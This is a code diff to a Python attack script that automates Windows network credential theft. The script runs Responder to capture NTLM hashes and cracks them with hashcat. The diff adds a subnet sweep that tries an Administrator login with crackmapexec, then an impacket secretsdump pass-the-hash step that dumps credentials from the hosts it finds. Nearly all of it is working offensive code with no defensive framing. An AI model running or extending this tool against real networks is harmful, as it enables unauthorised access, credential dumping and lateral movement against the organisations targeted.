@@ -57,6 +57,7 @@ import re
 import sys
 import os
 import hashlib
+from netaddr import IPNetwork
 
 def is_tool_installed(tool_name):
     """Check if a tool is installed by running 'which' command."""
@@ -68,6 +69,7 @@ def install_tools():
         "responder": "git+https://github.com/lgandx/Responder.git",
         "hashcat": "hashcat",
         "crackmapexec": "crackmapexec",
+        "impacket": "impacket",
     }
 
     for tool, install_command in tools.items():
@@ -86,7 +88,7 @@ def install_tools():
 
 def capture_hashes():
     print("[+] Starting Responder to capture hashes...")
-    responder_process = subprocess.Popen(['sudo', 'responder', '-I', 'eth0'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    responder_process = subprocess.Popen(['sudo', 'responder', '-I', 'eth0', '-wr', 'responder.pcap'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     return responder_process
 
 def stop_responder(responder_process):
@@ -111,18 +113,16 @@ def extract_hashes():
 
 def crack_hash(net_ntlm_hash):
     print(f"[+] Cracking hash: {net_ntlm_hash}")
-    # Save the hash to a file for hashcat
     hash_file = "netntlmv2.hash"
     with open(hash_file, "w") as file:
         file.write(net_ntlm_hash + "\n")
 
-    # Run hashcat to crack the Net-NTLMv2 hash
     hashcat_command = [
         "hashcat",
         "-m", "5600",
         hash_file,
-        "rockyou.txt",  # Specify the path to your wordlist
-        "--rules-file", "one-rule-to-rule-them-all.rule",  # Specify the path to your rules file
+        "rockyou.txt",  # Path to your wordlist
+        "--rules-file", "one-rule-to-rule-them-all.rule",  # Path to your rules file
         "--show"
     ]
     result = subprocess.run(hashcat_command, capture_output=True, text=True)
@@ -152,6 +152,35 @@ def run_crackmapexec(target, ntlm_hash):
     ]
     result = subprocess.run(command, capture_output=True, text=True)
     return result.stdout
+
+def run_secretsdump(target, username, ntlm_hash):
+    command = [
+        "secretsdump.py",
+        f"{username}@{target}",
+        "-hashes",
+        f"{ntlm_hash}:{ntlm_hash}"
+    ]
+    result = subprocess.run(command, capture_output=True, text=True)
+    return result.stdout
+
+def scan_subnet(subnet):
+    print(f"[+] Scanning subnet: {subnet}")
+    for ip in IPNetwork(subnet):
+        ip = str(ip)
+        print(f"[+] Scanning {ip}")
+        command = [
+            "crackmapexec",
+            "smb",
+            ip,
+            "-u", "Administrator",
+            "-p", "password",  # Use a password that won't lock accounts
+            "--continue-on-success"
+        ]
+        result = subprocess.run(command, capture_output=True, text=True)
+        if "SMB" in result.stdout:
+            print(f"[+] Found SMB service on {ip}")
+            return ip
+    return None
 
 def main():
     # Install dependencies
@@ -186,16 +215,29 @@ def main():
 
     ntlm_hashes = [get_ntlm_hash(password) for password in cracked_passwords if password]
 
-    # Run crackmapexec using captured NTLM hashes
-    target = "TARGET_MACHINE_NAME"
-    for ntlm_hash in ntlm_hashes:
-        print(f"[+] Using NTLM hash: {ntlm_hash}")
-        output = run_crackmapexec(target, ntlm_hash)
-        if output:
-            print("[+] Command output:")
-            print(output)
-        else:
-            print("[-] Failed to execute command on target")
+    # Run crackmapexec or secretsdump on the subnet
+    subnet = "192.168.1.0/24"  # Change to your subnet
+    target_ip = scan_subnet(subnet)
+
+    if target_ip:
+        print(f"[+] Target machine found at {target_ip}")
+        for ntlm_hash in ntlm_hashes:
+            print(f"[+] Using NTLM hash: {ntlm_hash}")
+            # Run crackmapexec using captured NTLM hashes
+            output = run_crackmapexec(target_ip, ntlm_hash)
+            if output:
+                print("[+] Command output:")
+                print(output)
+            else:
+                print("[-] Failed to execute command on target")
+            
+            # Run secretsdump if the target is accessible
+            secrets_output = run_secretsdump(target_ip, 'Administrator', ntlm_hash)
+            if secrets_output:
+                print("[+] Secretsdump output:")
+                print(secrets_output)
+            else:
+                print("[-] Failed to dump secrets")
 
 if __name__ == "__main__":
     main()
